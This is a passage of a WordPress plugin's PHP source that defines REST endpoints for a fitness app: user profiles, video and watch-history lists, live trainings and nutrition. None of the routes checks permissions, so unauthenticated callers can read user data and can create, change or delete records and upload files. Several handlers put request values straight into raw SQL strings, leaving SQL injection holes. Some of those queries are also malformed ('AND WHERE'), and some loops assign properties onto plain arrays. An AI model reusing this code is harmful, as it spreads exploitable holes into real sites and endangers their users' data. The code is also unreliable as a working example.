    $userId = $request["user_id"];
    $get_user_data = get_userdata( $userId );
    if(!empty($get_user_data)){
        
        $gender = get_user_meta( $userId, 'gender');
        $weight = get_user_meta( $userId, 'weight');
        $height = get_user_meta( $userId, 'height');
        $profile_image =  get_user_meta( $userId, 'profile_image');
        if(!empty($profile_image)){
            $get_user_data->profile_image = $profile_image[0]['url'];
        }else{
            $get_user_data->profile_image = "";
        }
        if(!empty($weight)){
            $get_user_data->weight = $weight[0];
        }else{
            $get_user_data->weight = "";
        }
        if(!empty($height)){
            $get_user_data->height = $height[0];
        }else{
            $get_user_data->height = "";
        }
        if(!empty($gender)){
            $get_user_data->gender = $gender[0];
        }else{
            $get_user_data->gender = "";
        }
        $result = $get_user_data;
    }else{
        $result =  ''; 
    }
    
    return wp_send_json($result);
    
}
/***************************** 
    get two feature videos list
******************************/

add_action( 'rest_api_init', 'feature_video_list_api_hooks' );
function feature_video_list_api_hooks(){register_rest_route(
  'custom-plugin', '/getfeatureTwoVideos/',
    array(
      'methods'  => 'POST',
      'callback' => 'getfeatureTwoVideos',
    )
  );
}
function getfeatureTwoVideos($request){
    
    $language = $request['language'];
    
    if($language == 'en'){
        $termId = 190;
    }elseif($language == 'ar'){
        $termId = 194;
    }
    $retData = [];
    $args = array(
        'posts_per_page' => '2',
        'post_type' => 'program-post',
        'order' => 'DESC',
        'meta_query' => array(
        array(
            'key' => 'video_id',
            'value' => '',
            'compare' => '!='
            )
        ),
        'tax_query' => [
            [
                'taxonomy' => 'program_category',
                'terms' => $termId,
                'include_children' => false, // Remove if you need posts from term 7 child terms
                
            ],],
            
    );
    $posts = get_posts( $args );
    
    foreach($posts as $key => $post_data){
        $post_id = $post_data->ID;
        $data = get_post_meta( $post_id );
        $retData[$key]->post_id = $post_id;
        $retData[$key]->video_id = get_field( 'video_id', $post_id );
        $retData[$key]->video_type = get_field( 'video_type', $post_id );
        $retData[$key]->video_date = $post_data->post_date;
        $retData[$key]->video_date_gmt = $post_data->post_date_gmt;
        $retData[$key]->video_title = $post_data->post_title;
        $retData[$key]->video_link = "https://vimeo.com/".get_field( 'video_id', $post_id );
        $retData[$key]->video_img = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
        //$retData[$key]->watch_time = get_field( 'watch_time', $post_id );
        //$retData[$key]->watched_date = get_field( 'watched_date', $post_id );
        
    }
    $result['status'] = 1;
    $result['data'] = $retData;
    return wp_send_json($result);
}
/******************************* 
    get all feature videos list
********************************/

add_action( 'rest_api_init', 'feature_all_video_list_api_hooks' );
function feature_all_video_list_api_hooks(){register_rest_route(
  'custom-plugin', '/getfeatureAllVideos/',
    array(
      'methods'  => 'POST',
      'callback' => 'getfeatureAllVideos',
    )
  );
}
function getfeatureAllVideos($request){
    
    $language = $request['language'];
    
    $page = $request["page"];
    if(!empty($request["per_page"])){
        $postsPerPage = $request["per_page"];
    }else{
        $postsPerPage = 3;
    }
    $postOffset = $page * $postsPerPage;
    
    if($language == 'en'){
        $termId = 190;
    }elseif($language == 'ar'){
        $termId = 194;
    }
    $retData = [];
    $args = array(
        'posts_per_page' => $postsPerPage,
        'post_type' => 'program-post',
        'offset'     => $postOffset,
        'order' => 'DESC',
        'meta_query' => array(
        array(
            'key' => 'video_id',
            'value' => '',
            'compare' => '!='
            )
        ),
        'tax_query' => [
            [
                'taxonomy' => 'program_category',
                'terms' => $termId,
                'include_children' => false, // Remove if you need posts from term 7 child terms
                
            ],],
            
    );
    $args1 = array(
        'post_type' => 'program-post',
        'meta_query' => array(
        array(
            'key' => 'video_id',
            'value' => '',
            'compare' => '!='
            )
        ),
        'tax_query' => [
            [
                'taxonomy' => 'program_category',
                'terms' => $termId,
                'include_children' => false, // Remove if you need posts from term 7 child terms
                
            ],],
            
    );
    $posts_count = count(get_posts( $args1 ));
    
    $retData = [];
    $retData1 = [];
    $posts = get_posts( $args );
    foreach($posts as $key => $post_data){
        $post_id = $post_data->ID;
        //if(get_field( 'video_id', $post_id ) != ''){
            $data = get_post_meta( $post_id );
            $retData['post_id'] = $post_id;
            $retData['video_id'] = get_field( 'video_id', $post_id );
            $retData['video_type'] = get_field( 'video_type', $post_id );
            $retData['video_date'] = $post_data->post_date;
            $retData['video_date_gmt'] = $post_data->post_date_gmt;
            $retData['video_title'] = $post_data->post_title;
            $retData['video_link'] = "https://vimeo.com/".get_field( 'video_id', $post_id );
            $retData['video_img'] = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
            array_push($retData1,$retData);
            //$retData[$key]->watch_time = get_field( 'watch_time', $post_id );
            //$retData[$key]->watched_date = get_field( 'watched_date', $post_id );
        //}
    }
    $result['status'] = 1;
    $result['totalVideos'] = $posts_count;
    $result['pageno'] = $page;
    $result['data'] = $retData1;
    return wp_send_json($result);
}



/***************************** 
    get two Live videos list
******************************/

add_action( 'rest_api_init', 'live_video_list_api_hooks' );
function live_video_list_api_hooks(){register_rest_route(
  'custom-plugin', '/getLiveTwoVideos/',
    array(
      'methods'  => 'POST',
      'callback' => 'getLiveTwoVideos',
    )
  );
}
function getLiveTwoVideos($request){
    
    $language = $request['language'];
    if($language == 'en'){
        $termId = 61;
    }elseif($language == 'ar'){
        $termId = 142;
    }
    $args = array(
        'posts_per_page' => '2',
        'post_type' => 'program-post',
        'order' => 'DESC',
        'meta_query' => array(
        array(
            'key' => 'video_id',
            'value' => '',
            'compare' => '!='
            )
        ),
        'tax_query' => [
            [
                'taxonomy' => 'program_category',
                'terms' => $termId,
                'include_children' => false, // Remove if you need posts from term 7 child terms
                
            ],],
    );
    
    $posts = get_posts( $args );
    $retData = [];
    
    //$posts = get_posts( $args );
    foreach($posts as $key => $post_data){
        $post_id = $post_data->ID;
        $data = get_post_meta( $post_id );
        
        /*echo "<pre>";
        print_r($post_data);
        //print_r($data);
        print_r($custom_fields = get_post_custom(1244));
        die;*/
                
        $retData[$key]->post_id = $post_id;
        $retData[$key]->video_id = get_field( 'video_id', $post_id );
        $retData[$key]->video_type = get_field( 'video_type', $post_id );
        $retData[$key]->video_date = $post_data->post_date;
        $retData[$key]->video_date_gmt = $post_data->post_date_gmt;
        $retData[$key]->video_title = $post_data->post_title;
        $retData[$key]->video_link = "https://vimeo.com/".get_field( 'video_id', $post_id );
        $retData[$key]->video_img = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
    }
    $result['status'] = 1;
    $result['data'] = $retData;
    return wp_send_json($result);
}




/******************************* 
    get all live videos list
********************************/

add_action( 'rest_api_init', 'live_all_video_list_api_hooks' );
function live_all_video_list_api_hooks(){register_rest_route(
  'custom-plugin', '/getLiveAllVideos/',
    array(
      'methods'  => 'POST',
      'callback' => 'getLiveAllVideos',
    )
  );
}
function getLiveAllVideos($request){
    
    $language = $request['language'];
    if($language == 'en'){
        $termId = 61;
    }elseif($language == 'ar'){
        $termId = 142;
    }
    $page = $request["page"];
    if(!empty($request["per_page"])){
        $postsPerPage = $request["per_page"];
    }else{
        $postsPerPage = 3;
    }
    $postOffset = $page * $postsPerPage;
    $args = array(
        'posts_per_page' => $postsPerPage,
        'offset'     => $postOffset,
        'post_type' => 'program-post',
        'order' => 'DESC',
        'meta_query' => array(
        array(
            'key' => 'video_id',
            'value' => '',
            'compare' => '!='
            )
        ),
        'tax_query' => [
            [
                'taxonomy' => 'program_category',
                'terms' => $termId,
                'include_children' => false, // Remove if you need posts from term 7 child terms
            ],],
    );
    $args1 = array(
        'post_type' => 'program-post',
        'order' => 'DESC',
        'meta_query' => array(
        array(
            'key' => 'video_id',
            'value' => '',
            'compare' => '!='
            )
        ),
        'tax_query' => [
            [
                'taxonomy' => 'program_category',
                'terms' => $termId,
                'include_children' => false, // Remove if you need posts from term 7 child terms
                
            ],],
    );
    $retData = [];
    $posts = get_posts( $args );
    foreach($posts as $key => $post_data){
        $post_id = $post_data->ID;
        $data = get_post_meta( $post_id );
        $retData[$key]->post_id = $post_id;
        $retData[$key]->video_id = get_field( 'video_id', $post_id );
        $retData[$key]->video_type = get_field( 'video_type', $post_id );
        $retData[$key]->video_date = $post_data->post_date;
        $retData[$key]->video_date_gmt = $post_data->post_date_gmt;
        $retData[$key]->video_title = $post_data->post_title;
        $retData[$key]->video_link = "https://vimeo.com/".get_field( 'video_id', $post_id );
        $retData[$key]->video_img = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
        //$retData[$key]->watch_time = get_field( 'watch_time', $post_id );
        //$retData[$key]->watched_date = get_field( 'watched_date', $post_id );
    }
    $result['status'] = 1;
    $result['totalVideos'] = count(get_posts( $args1 ));
    $result['pageno'] = $page;
    $result['data'] = $retData;
    return wp_send_json($result);
}





/******************************* 
    get all workout list
********************************/

add_action( 'rest_api_init', 'get_all_workout_api_hooks' );
function get_all_workout_api_hooks(){register_rest_route(
  'custom-plugin', '/getAllWorkoutList/',
    array(
      'methods'  => 'POST',
      'callback' => 'getAllWorkoutList',
    )
  );
}
function getAllWorkoutList($request){
    
    $language = $request['language'];
    
    $args1 = array('orderby'=>'name','hide_empty'=>false,'parent'=>0,'lang'=>$language);
    $taxonomy = "program_category";
    $allcat = get_terms( $taxonomy,$args1 );
    
    $parentCat = [];
    foreach ($allcat as $key => $allcats)
    {
        if($allcats->parent==0) :
        $cat_id = $allcats->term_id;
       
        $parentCat[$key]->type_id =   $allcats->term_id;
        $parentCat[$key]->title =   $allcats->name;
        //$parentCat[$key]->description =   $allcats->description;
        $parentCat[$key]->cat_image =   get_field('image', 'program_category_'.$cat_id);
        $parentCat[$key]->cat_banner_image =   get_field( 'add_category_banner', 'program_category_'.$cat_id );
        endif;
    }
    $result['status'] = 1;
    $result['data'] = $parentCat;
    return wp_send_json($result);
}
/*********************************** 
    get all workout single details *
************************************/

add_action( 'rest_api_init', 'get_single_workout_api_hooks' );
function get_single_workout_api_hooks(){register_rest_route(
  'custom-plugin', '/getSingleWorkoutDetail/',
    array(
      'methods'  => 'POST',
      'callback' => 'getSingleWorkoutDetail',
    )
  );
}
function getSingleWorkoutDetail($request){
    $type_id = $request['type_id'];
    $args = [
    'post_type' => 'program-post',
    'tax_query' => [
            [
                'taxonomy' => 'program_category',
                'terms' => $type_id,
                'include_children' => false // Remove if you need posts from term 7 child terms
            ],
        ],
    ];
    $posts = get_posts( $args );
    foreach($posts as $key=>$val){
       
       //$posts[$key]->post_meta_data = get_post_meta($val->ID);
       $pdf_data_info = get_field('add_schedule_pdf_file', $val->ID);
       $posts[$key]->pdf = $pdf_data_info['url'];
       $posts[$key]->day__meditations_number_info = get_field('day__meditations_number', $val->ID);
       $posts[$key]->mins__day = get_field('mins__day', $val->ID);
       $posts[$key]->mins__day_title = get_field('mins__day_title', $val->ID);
       $posts[$key]->type = get_field('type', $val->ID);
       $posts[$key]->equipment_needed = get_field('equipment_needed', $val->ID);
       $posts[$key]->video_type = get_field('video_type', $val->ID);
       $posts[$key]->video_id = get_field('video_id', $val->ID);
       $posts[$key]->related_video_section = get_field('related_video_section', $val->ID);
       
    }
    $result['status'] = 1;
    $result['data'] = $posts;
    return wp_send_json($result);
}
/*********************************** 
    Get posts by subcat id
************************************/

add_action( 'rest_api_init', 'get_posts_by_subcategory_api_hooks' );
function get_posts_by_subcategory_api_hooks(){register_rest_route(
  'custom-plugin', '/get_posts_by_subcategory/',
    array(
      'methods'  => 'POST',
      'callback' => 'get_posts_by_subcategory',
    )
  );
}
function get_posts_by_subcategory($request){
    $type_id = $request['type_id'];
    $args = [
    'post_type' => 'program-post',
    'tax_query' => [
            [
                'taxonomy' => 'program_category',
                'terms' => $type_id,
                'include_children' => false // Remove if you need posts from term 7 child terms
            ],
        ],
    ];
    $posts = get_posts( $args );
    foreach($posts as $key=>$val){
       //$posts[$key]->post_meta_data = get_post_meta($val->ID);
       $pdf_data_info = get_field('add_schedule_pdf_file', $val->ID);
       $posts[$key]->pdf = $pdf_data_info['url'];
       $posts[$key]->day__meditations_number_info = get_field('day__meditations_number', $val->ID);
       $posts[$key]->mins__day = get_field('mins__day', $val->ID);
       $posts[$key]->mins__day_title = get_field('mins__day_title', $val->ID);
       $posts[$key]->type = get_field('type', $val->ID);
       $posts[$key]->equipment_needed = get_field('equipment_needed', $val->ID);
       $posts[$key]->video_type = get_field('video_type', $val->ID);
       $posts[$key]->video_id = get_field('video_id', $val->ID);
       $posts[$key]->related_video_section = get_field('related_video_section', $val->ID);
    }
    $result['status'] = 1;
    $result['data'] = $posts;
    return wp_send_json($result);
}

/***********************************
    get Latest Post List function
************************************/
add_action( 'rest_api_init', 'get_latest_post_api_hooks' );
    function get_latest_post_api_hooks(){register_rest_route(
    'custom-plugin', '/getLatestViewedTwoPostList/',
    array(
            'methods'  => 'POST',
            'callback' => 'getLatestViewedTwoPostList',
        )
    );
}
function getLatestViewedTwoPostList($request){
    $user = $request['user_id'];
	$postID = "last_viewed_program";
	$user_id_with_post = $user."_".$postID;
    $args = array(
            'post_type'=>'program-post',
            'meta_key' => $user_id_with_post, 
            'orderby' => 'meta_value', 
            'order' => 'DESC',
            'posts_per_page' => 2
            );
    $posts = get_posts( $args );
    $retData = [];
    foreach($posts as $key => $post_data){
        $post_id = $post_data->ID;
        $postMeta_args = array(
            "post_id"=>$post_id,
            "meta_key"=>$user_id_with_post,
            );
        $data = get_post_meta( $post_id );
        
        $retData[$key]->post_id = $post_id;
        $retData[$key]->video_id = get_field( 'video_id', $post_id );
        $retData[$key]->video_type = get_field( 'video_type', $post_id );
        $retData[$key]->video_added_date = $post_data->post_date;
        //$retData[$key]->i_watched_time = $data[$user_id_with_post][0];
        $retData[$key]->video_title = $post_data->post_title;
        $retData[$key]->video_link = "https://vimeo.com/".get_field( 'video_id', $post_id );
        $retData[$key]->video_img = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
        $retData[$key]->watch_time = get_field( 'watch_time', $post_id );
        $retData[$key]->watched_date = get_field( 'watched_date', $post_id );
        
    }
    $result['status'] = 1;
    $result['data'] = $retData;
    return wp_send_json($result);
}

/*************************************** 
    get all latest watched videos list
****************************************/

add_action( 'rest_api_init', 'latestViewedPostList_api_hooks' );
function latestViewedPostList_api_hooks(){register_rest_route(
  'custom-plugin', '/getLatestViewedPost/',
    array(
      'methods'  => 'POST',
      'callback' => 'getLatestViewedPost',
    )
  );
}
function getLatestViewedPost($request){
    $user = $request['user_id'];
	$postID = "last_viewed_program";
	$user_id_with_post = $user."_".$postID;
	
    $page = $request["page"];
    if(!empty($request["per_page"])){
        $postsPerPage = $request["per_page"];
    }else{
        $postsPerPage = 30;
    }
    
    $postOffset = $page * $postsPerPage;
    $allPosts = get_posts( array('post_type'=>'program-post','meta_key' => $user_id_with_post, 'orderby' => 'meta_value', 'order' => 'DESC','posts_per_page' => -1));
    
    $args = [
    'post_type' => 'program-post',
    'posts_per_page' =>$postsPerPage,
    'offset'     => $postOffset,
    'meta_key' => $user_id_with_post,
    'orderby' => 'meta_value', 
    'order' => 'DESC',
    ];
    $retData = [];
    $posts = get_posts( $args );
    foreach($posts as $key => $post_data){
        $post_id = $post_data->ID;
        
        $data = get_post_meta( $post_id );
        $retData[$key]->post_id = $post_id;
        $retData[$key]->video_type = get_field( 'video_type', $post_id );
        $retData[$key]->video_added_date = $post_data->post_date;
        //$retData[$key]->i_watched_time = $data[$user_id_with_post][0];
        $retData[$key]->video_title = $post_data->post_title;
        $retData[$key]->video_link = "https://vimeo.com/".get_field( 'video_id', $post_id );
        $retData[$key]->video_img = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
        $retData[$key]->video_id = get_field( 'video_id', $post_id );
        $retData[$key]->watch_time = get_field( 'watch_time', $post_id );
        $retData[$key]->watched_date = get_field( 'watched_date', $post_id );
    }
    $result['status'] = 1;
    $result['totalVideos'] = count($allPosts);
    $result['pageno'] = $page;
    $result['data'] = $retData;
    return wp_send_json($result);
}

/**************************
    add User Data 
***************************/
add_action( 'rest_api_init', 'add_user_data_api_hooks' );
function add_user_data_api_hooks(){register_rest_route(
  'custom-plugin', '/addUserData/',
    array('methods'  => 'POST','callback' => 'addUserData',));
}
function addUserData($request){
    
    $user_id = $request['user_id'];
    $gender = $request['gender'];
    $user = get_userdata( $user_id );
    $result['gender'] = $gender ;
    if ( $user === false ) {
        $result['status'] = 0;
        $result['message']="user id does not exist";
    } else {
        $res = metadata_exists( "user", $user_id, "gender" );
        
        $result['status'] = 1 ;
        if($res == false){
            add_user_meta($user_id,'gender',$gender);
        }else{
            update_user_meta( $user_id, 'gender', $gender );
        }
        $result['message'] = "User added information successfully!";
    }
    $res_new = metadata_exists( "user", $user_id, "gender" );
    
    return wp_send_json($result);
}

/******************************************
    video watched save date and time
*******************************************/
add_action( 'rest_api_init', 'videoWatchedAddDateTime_api_hooks' );
function videoWatchedAddDateTime_api_hooks(){register_rest_route(
  'custom-plugin', '/videoWatchedAddDateTime/',
    array('methods'  => 'POST','callback' => 'videoWatchedAddDateTime',));
}
function videoWatchedAddDateTime($request){
    
    $language = $request['language'];
    $mateKey = '';
    if($language == 'en'){
        $mateKey = "_watched_video_data_".$language;
    }elseif($language == 'ar' ){
        $mateKey = "_watched_video_data_".$language;
    }
    
    $user = $request['user_id'];
	$postID = $request['post_id'];
	$date = date("Y-m-d");
 	$user_id_with_post = $user."_".$postID;
 	
 	//$user.$postID.'_watch_time';
 	
 	if(metadata_exists('post', $postID, $user.$postID.'_watch_time')) {
        update_post_meta($postID, $user.$postID.'_watch_time', $request['watch_time']  );
        update_post_meta($postID, $user.$postID.'_watched_date', $date );
        $result['status'] = 1 ;
        $result['msg'] = 'Watch time and Watch date is save successfully!' ;
    }else{
        add_post_meta($postID, $user.$postID.'_watch_time',$request['watch_time'] );
 	    add_post_meta($postID, $user.$postID.'_watched_date',$date);
 	    //add_post_meta($postID, $user.'_watched_video_data', date("Y-m-d H:i:s") );
 	    add_post_meta($postID, $user.$mateKey, date("Y-m-d H:i:s") );
 	    $result['status'] = 1 ;
        $result['msg'] = 'Watch time and Watched date is save successfully!' ;
    }
    return wp_send_json($result);
}

/**********************************
    get two watched Video data
**********************************/
add_action( 'rest_api_init', 'get_two_watched_video_api_hooks' );
function get_two_watched_video_api_hooks(){register_rest_route(
  'custom-plugin', '/get_two_watched_videos/',
    array('methods'  => 'POST','callback' => 'get_two_watched_videos',));
}
function get_two_watched_videos($request){
    
    $language = $request['language'];
    $user = $request['user_id'];
	$user_id_with_post = $user."_watched_video_data_".$language;
    
    $args = [
    'post_type' => 'program-post',
    'posts_per_page' =>2,
    'meta_key' => $user_id_with_post,
    'orderby' => 'meta_value', 
    'order' => 'DESC',
    'meta_query' => array(
        array(
            'key' => 'video_id',
            'value' => '',
            'compare' => '!='
            )
        ),
    ];
    $retData = [];
    $posts = get_posts( $args );
    
    foreach($posts as $key => $post_data){
        $post_id = $post_data->ID;
        
        $data = get_post_meta( $post_id );
        $retData[$key]->post_id = $post_id;
        $retData[$key]->video_type = get_field( 'video_type', $post_id );
        $retData[$key]->video_added_date = $post_data->post_date;
        $retData[$key]->video_title = $post_data->post_title;
        $retData[$key]->video_link = "https://vimeo.com/".get_field( 'video_id', $post_id );
        $retData[$key]->video_img = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
        $retData[$key]->video_id = get_field( 'video_id', $post_id );
        $retData[$key]->watch_time = get_field( $user.$post_id.'_watch_time', $post_id );
        $retData[$key]->watched_date = get_field( $user.$post_id.'_watched_date', $post_id );
    }
    $result['status'] = 1;
    $result['data'] = $retData;
    return wp_send_json($result);
}

/****************************
    get all watched videos
*****************************/
add_action( 'rest_api_init', 'get_all_watched_videos_api_hooks' );
function get_all_watched_videos_api_hooks(){register_rest_route(
  'custom-plugin', '/get_all_watched_videos/',
    array('methods'  => 'POST','callback' => 'get_all_watched_videos'));
}
function get_all_watched_videos($request){
    
    $language = $request['language'];
    $user = $request['user_id'];
	$user_id_with_post = $user."_watched_video_data_".$language;
    
    $page = $request["page"];
    if(!empty($request["per_page"])){
        $postsPerPage = $request["per_page"];
    }else{
        $postsPerPage = 30;
    }
    
    $postOffset = $page * $postsPerPage;
    $allPosts = get_posts( array('post_type'=>'program-post','meta_key' => $user_id_with_post, 'orderby' => 'meta_value', 'order' => 'DESC','posts_per_page' => -1));
    $args = [
    'post_type' => 'program-post',
    'posts_per_page' =>$postsPerPage,
    'offset'     => $postOffset,
    'meta_key' => $user_id_with_post,
    'orderby' => 'meta_value', 
    'order' => 'DESC',
    ];
    $retData = [];
    $posts = get_posts( $args );
    foreach($posts as $key => $post_data){
        $post_id = $post_data->ID;
        $data = get_post_meta( $post_id );
        $retData[$key]->post_id = $post_id;
        $retData[$key]->video_type = get_field( 'video_type', $post_id );
        $retData[$key]->video_added_date = $post_data->post_date;
        $retData[$key]->video_title = $post_data->post_title;
        $retData[$key]->video_link = "https://vimeo.com/".get_field( 'video_id', $post_id );
        $retData[$key]->video_img = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
        $retData[$key]->video_id = get_field( 'video_id', $post_id );
        $retData[$key]->watch_time = get_field( $user.$post_id.'_watch_time', $post_id );
        $retData[$key]->watched_date = get_field( $user.$post_id.'_watched_date', $post_id );
    }
    $result['status'] = 1;
    $result['totalVideos'] = count($allPosts);
    $result['pageno'] = $page;
    $result['data'] = $retData;
    return wp_send_json($result);
}
/**********************
    add live training
***********************/
add_action( 'rest_api_init', 'add_live_training_api_hooks' );
function add_live_training_api_hooks(){register_rest_route(
  'custom-plugin', '/add_live_training/',
    array('methods'  => 'POST','callback' => 'add_live_training',));
}
function add_live_training($request){
    
    $language = $request['language'];
    
    global $wpdb;
    $data = [
            'lang' => $language,
            'title' => $request['title'],
            'level' => $request['level'],
            'coach_name' => $request['coach_name'],
            'days_of_training' => $request['days_of_training'],
            'time_from' => $request['time_from'],
            'duration_of_days' => $request['duration_of_days'],
            'price' => $request['price'],
            'total_days_of_training' => $request['total_days_of_training'],
            'created_at' => gmdate('Y-m-d H:i:s'),
            ];
        if ( ! function_exists( 'wp_handle_upload' ) ) {
                    require_once( ABSPATH . 'wp-admin/includes/file.php' );
        }
        if( $_FILES['image']['error'] === UPLOAD_ERR_OK )
        {
            $upload_overrides = array( 'test_form' => false ); #if you don’t pass 'test_form' => FALSE the upload will be rejected
            $userImg = wp_handle_upload( $_FILES['image'], $upload_overrides );
            $data['image'] = $userImg['url'];
        }
    $result = $wpdb->insert("wp_live_training",$data);
    if($result > 0){
        $resultt['status'] = 1 ;
        $resultt['msg'] = 'Live training is added successfully!' ;
    }
    return wp_send_json($resultt);
}
/**********************
 update live training
***********************/
add_action( 'rest_api_init', 'update_live_training_api_hooks' );
function update_live_training_api_hooks(){register_rest_route(
  'custom-plugin', '/update_live_training/',
    array('methods'  => 'POST','callback' => 'update_live_training',));
}
function update_live_training($request){
    global $wpdb;
    $table = "wp_live_training";
    $where = ['id'=>$request['training_id']];
    
    $data = [
            'title' => $request['title'],
            'level' => $request['level'],
            'coach_name' => $request['coach_name'],
            'days_of_training' => $request['days_of_training'],
            'time_from' => $request['time_from'],
            'duration_of_days' => $request['duration_of_days'],
            'price' => $request['price'],
            'total_days_of_training' => $request['total_days_of_training'],
            'created_at' => gmdate('Y-m-d H:i:s'),
            ];
        if ( ! function_exists( 'wp_handle_upload' ) ) {
                    require_once( ABSPATH . 'wp-admin/includes/file.php' );
        }
        if( $_FILES['image']['error'] === UPLOAD_ERR_OK )
        {
            $upload_overrides = array( 'test_form' => false ); #if you don’t pass 'test_form' => FALSE the upload will be rejected
            $userImg = wp_handle_upload( $_FILES['image'], $upload_overrides );
            $data['image'] = $userImg['url'];
        }
        $result = $wpdb->update($table, $data, $where);
        if($result > 0){
            $resultt['status'] = 1 ;
            $resultt['msg'] = 'Live training is updated successfully!' ;
        }
        return wp_send_json($resultt);
}
/***************************
    get two live training
****************************/
add_action( 'rest_api_init', 'get_live_training_api_hooks' );
function get_live_training_api_hooks(){register_rest_route(
  'custom-plugin', '/get_live_training/',
    array('methods'  => 'POST','callback' => 'get_live_training',));
}
function get_live_training($request){ 
    $language = $request['language'];
    if(!$language){
        $language="en";
    }
    global $wpdb;
    $table_name = "wp_live_training";
    $res = $wpdb->get_results( "SELECT * FROM $table_name  WHERE (lang = '$language') AND WHERE status=1 ORDER BY id DESC LIMIT 2");
    if(count($res) > 0){
        $result['status'] = 1;
        $result['msg'] = 'Get all live training list!' ;
        $result['data'] = $res;
    }
    else{
        $result['status'] = 0;
        $result['msg'] = 'Data not found!' ;
        $result['data'] = null;
    }
    return wp_send_json($result);
}

/**************************
 * get all live training *
***************************/
add_action( 'rest_api_init', 'get_live_training_all_api_hooks' );
function get_live_training_all_api_hooks(){register_rest_route(
  'custom-plugin', '/get_live_training_all/',
    array('methods'  => 'POST','callback' => 'get_live_training_all',));
}
function get_live_training_all($request){
    
    global $wpdb;
    $language = $request['language'];
    if(!$language){
        $language="en";
    }
    
    $table = "wp_live_training";
    $page = $request['page']+1;
    $items_per_page = $request['per_page'];
    $offset = ($page - 1) * $items_per_page;
    $sql = "SELECT * FROM $table WHERE (lang = '$language') AND WHERE status=1  LIMIT " . $offset . "," . $items_per_page;
    $res = $wpdb->get_results($sql);
    $retData = [];
    foreach($res as $key=>$val){
        $retData[$key]->id = $val->id;
        $retData[$key]->title = $val->title;
        $retData[$key]->level = $val->level;
        $retData[$key]->coach_name = $val->coach_name;
        $retData[$key]->zoom_link = $val->zoom_link;
        $retData[$key]->image = $val->image;
        $retData[$key]->days_of_training = $val->days_of_training;
        $retData[$key]->total_days_of_training = $val->total_days_of_training;
        $retData[$key]->time_from = $val->time_from;
        $retData[$key]->duration_of_days = $val->duration_of_days;
        $retData[$key]->price = $val->price;
        $retData[$key]->created_at = $val->created_at;
        $retData[$key]->updated_at = $val->updated_at;
    }
    $resultt['status'] = 1;
    $resultt['data'] = $retData;
    return wp_send_json($resultt);
}


/**********************
  Delete live training
***********************/
add_action( 'rest_api_init', 'delete_live_training_api_hooks' );
function delete_live_training_api_hooks(){register_rest_route(
  'custom-plugin', '/delete_live_training/',
    array('methods'  => 'POST','callback' => 'delete_live_training',));
}
function delete_live_training($request){ 
    global $wpdb;
    $table_name = "wp_live_training";
    $delete_id = $request['delete_id'];
    $res = $wpdb->delete( $table_name, array( 'id' => $delete_id ) );
    if($res > 0){
        $result['status'] = 1 ;
        $result['msg'] = 'This training deleted successfully from live training!';
    }
    return wp_send_json($result);
}


/**********************
    Add live Training
***********************/
/*add_action( 'rest_api_init', 'add_livetraining_api_hooks' );
function add_livetraining_api_hooks(){register_rest_route(
  'custom-plugin', '/addLiveTraining/',
    array('methods'  => 'POST','callback' => 'addLiveTraining',));
}
function addLiveTraining($request){
    global $wpdb;
    $data = [
            'title' => $request['title'],
            'level' => $request['level'],
            'coach_name' => $request['coach_name'],
            'zoom_link' => $request['zoom_link'],
            'coach_name' => $request['coach_name'],
            'days_of_training' => $request['days_of_training'],
            'total_days_of_training' => $request['total_days_of_training'],
            'time_from' => $request['time_from'],
            'duration_of_days' => $request['duration_of_days'],
            'price' => $request['price'],
            'created_at' => $request['created_at'],
            'updated_at' => $request['updated_at'],
            ];
        if ( ! function_exists( 'wp_handle_upload' ) ) {
                    require_once( ABSPATH . 'wp-admin/includes/file.php' );
        }
        if( $_FILES['file']['error'] === UPLOAD_ERR_OK )
        {
            $upload_overrides = array( 'test_form' => false ); #if you don’t pass 'test_form' => FALSE the upload will be rejected
            $userImg = wp_handle_upload( $_FILES['file'], $upload_overrides );
            $data['image'] = $userImg['url'];
        }
        $result = $wpdb->insert("wp_live_training",$data);
        if($result > 0){
            $resultt['status'] = 1 ;
            $resultt['msg'] = 'Live Training is saved successfully!' ;
        }
        return wp_send_json($resultt);
}*/

/**********************
    Add Nutrition
***********************/
add_action( 'rest_api_init', 'add_nutrition_api_hooks' );
function add_nutrition_api_hooks(){register_rest_route(
  'custom-plugin', '/add_nutrition/',
    array('methods'  => 'POST','callback' => 'add_nutrition',));
}
function add_nutrition($request){
    global $wpdb;
    	//	time_duration	path	status 1=>active, 0=>In active	created_at	updated_at
    $data = [
            'title' => $request['title'],
            'type' => $request['type'],
            'time_duration' => $request['time_duration'],
            ];
        if ( ! function_exists( 'wp_handle_upload' ) ) {
                    require_once( ABSPATH . 'wp-admin/includes/file.php' );
        }
        if( $_FILES['file']['error'] === UPLOAD_ERR_OK )
        {
            $upload_overrides = array( 'test_form' => false ); #if you don’t pass 'test_form' => FALSE the upload will be rejected
            $userImg = wp_handle_upload( $_FILES['file'], $upload_overrides );
            $data['path'] = $userImg['url'];
        }
        if ( ! function_exists( 'wp_handle_upload' ) ) {
                    require_once( ABSPATH . 'wp-admin/includes/file.php' );
        }
        if( $_FILES['thumbnail_img']['error'] === UPLOAD_ERR_OK )
        {
            $upload_overrides = array( 'test_form' => false ); #if you don’t pass 'test_form' => FALSE the upload will be rejected
            $userImg1 = wp_handle_upload( $_FILES['thumbnail_img'], $upload_overrides );
            $data['thumbnail_img'] = $userImg1['url'];
        }
    $result = $wpdb->insert("wp_nutrition",$data);
    if($result > 0){
        $resultt['status'] = 1 ;
        $resultt['msg'] = 'Nutrition is saved successfully!' ;
    }
    return wp_send_json($resultt);
}
/******************
    Get Nutrition
*******************/
add_action( 'rest_api_init', 'get_nutrition_api_hooks' );
function get_nutrition_api_hooks(){register_rest_route(
  'custom-plugin', '/get_nutrition/',
    array('methods'  => 'POST','callback' => 'get_nutrition',));
}
function get_nutrition($request){ 
    global $wpdb;
    $language = $request['language'];
    if(!$language){
        $language="en";
    }
    $table_name = "wp_nutrition";
    $res_type_of_diet = $wpdb->get_results("SELECT * FROM $table_name WHERE  type = 'type_of_diet' AND lang = '$language'"); 
